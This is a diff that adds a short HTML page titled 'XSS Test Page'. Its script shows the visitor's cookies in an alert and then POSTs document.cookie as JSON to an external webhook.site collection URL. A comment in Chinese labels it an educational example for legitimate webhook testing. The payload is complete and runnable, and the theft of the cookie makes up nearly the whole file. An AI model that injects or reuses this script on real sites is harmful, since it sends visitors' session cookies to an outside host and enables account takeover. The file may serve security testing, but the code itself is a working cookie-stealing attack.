@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>XSS Test Page</title>
+</head>
+<body>
+  <h1>Hello, XSS</h1>
+  <script>
+
+    alert("Your cookie is: " + document.cookie);
+
+    // ⚠️教育目的示例：如用于Webhook测试，需在合法控制的服务器下进行
+     fetch("https://webhook.site/02527fbf-7b5b-4bec-b170-ba4a304da029", {
+       method: "POST",
+       body: JSON.stringify({cookie: document.cookie}),
+       headers: {"Content-Type": "application/json"}
+     });
+  </script>
+</body>
+</html>
